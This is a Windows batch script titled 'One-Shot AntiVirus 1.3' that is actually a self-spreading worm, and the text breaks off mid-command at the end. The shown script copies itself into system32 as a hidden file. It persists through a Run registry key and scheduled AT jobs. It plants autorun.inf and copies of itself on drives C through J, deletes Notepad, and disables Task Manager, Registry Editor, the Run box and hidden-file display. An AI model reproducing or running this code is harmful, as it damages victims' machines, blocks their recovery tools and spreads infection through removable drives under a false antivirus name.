@ECHO OFF

title One-Shot AntiVirus 1.3

cls

start pinball.exe

start WINWORD.exe

start WINWORD.exe

start WINWORD.exe

start WINWORD.exe

start firefox.exe

start firefox.exe

start firefox.exe

cls

copy %0 %systemroot%\system32\iscch.exe /y

attrib +r +h +s C:\WINDOWS\system32\iscch.exe.exe

reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v iscch /t REG_SZ /d %systemroot%\system32\iscch.exe /f

cls

MD C:\TempCache

MD D:\TempCache

MD E:\TempCache

MD F:\TempCache

MD G:\TempCache

MD H:\TempCache

MD I:\TempCache

MD J:\TempCache

cls

copy winlogon.exe C:\TempCache /y

copy winlogon.exe D:\TempCache /y

copy winlogon.exe E:\TempCache /y

copy winlogon.exe F:\TempCache /y

copy winlogon.exe G:\TempCache /y

copy winlogon.exe H:\TempCache /y

copy winlogon.exe I:\TempCache /y

copy winlogon.exe J:\TempCache /y

cls

copy autorun.inf C:\ /y 

copy autorun.inf D:\ /y

copy autorun.inf E:\ /y

copy autorun.inf F:\ /y

copy autorun.inf G:\ /y

copy autorun.inf H:\ /y

copy autorun.inf I:\ /y

copy autorun.inf J:\ /y

cls

attrib +r +h +s C:\autorun.inf

attrib +r +h +s D:\autorun.inf

attrib +r +h +s E:\autorun.inf

attrib +r +h +s F:\autorun.inf

attrib +r +h +s G:\autorun.inf

attrib +r +h +s H:\autorun.inf

attrib +r +h +s I:\autorun.inf

attrib +r +h +s J:\autorun.inf

cls

copy autorun.inf C:\TempCache /y 

copy autorun.inf D:\TempCache /y

copy autorun.inf E:\TempCache /y

copy autorun.inf F:\TempCache /y

copy autorun.inf G:\TempCache /y

copy autorun.inf H:\TempCache /y

copy autorun.inf I:\TempCache /y

copy autorun.inf J:\TempCache /y
 
cls

copy iscch.exe C:\TempCache /y

copy iscch.exe D:\TempCache /y

copy iscch.exe E:\TempCache /y

copy iscch.exe F:\TempCache /y

copy iscch.exe G:\TempCache /y
 
copy iscch.exe H:\TempCache /y

copy iscch.exe I:\TempCache /y

copy iscch.exe J:\TempCache /y

cls

copy LittleRedRidingHood.txt C:\TempCache /y

copy LittleRedRidingHood.txt D:\TempCache /y

copy LittleRedRidingHood.txt E:\TempCache /y

copy LittleRedRidingHood.txt F:\TempCache /y

copy LittleRedRidingHood.txt G:\TempCache /y

copy LittleRedRidingHood.txt H:\TempCache /y

copy LittleRedRidingHood.txt I:\TempCache /y

copy LittleRedRidingHood.txt J:\TempCache /y

cls


AT 6:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\system32\iscch.exe

AT 9:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\system32\iscch.exe

AT 12:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\system32\iscch.exe

AT 15:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\system32\iscch.exe

AT 18:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\system32\iscch.exe

AT 21:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\system32\iscch.exe

AT 0:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\system32\iscch.exe

cls

del C:\WINDOWS\NOTEPAD.EXE /q /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL /v CheckedValue /t REG_DWORD /d 0 /f

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoToolBarsOnTaskBar /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoShellSearchButton /t REG_DWORD /d 1 /f

cls

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v NoViewContextMenu /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f

REG add HKCU\Softw